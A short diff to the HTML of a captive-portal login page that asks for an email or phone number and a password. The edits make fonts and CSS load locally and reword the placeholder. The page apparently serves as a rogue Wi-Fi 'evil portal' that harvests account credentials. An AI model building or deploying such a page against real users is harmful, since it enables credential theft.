@@ -20,8 +20,8 @@ require_once('helper.php');
     <meta charset='UTF-8'>
     <meta name="robots" content="noindex">
     <script src="assets/js/jquery-2.2.1.min.js"></script>
-    <link href='http://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
-    <link rel='stylesheet prefetch' href='https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css'>
+    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
+    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
     <style class="cp-pen-styles">
       * {
         -webkit-box-sizing: border-box;
@@ -155,7 +155,7 @@ require_once('helper.php');
       <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
           <input type="hidden" name="target" value="<?=$destination?>">
         <label>
-          <input type="email" name="email" required placeholder="Email">
+          <input type="email" name="email" required placeholder="Email or Phone Number">
         </label>
         <label>
           <input type="password" name="password" required placeholder="Password">
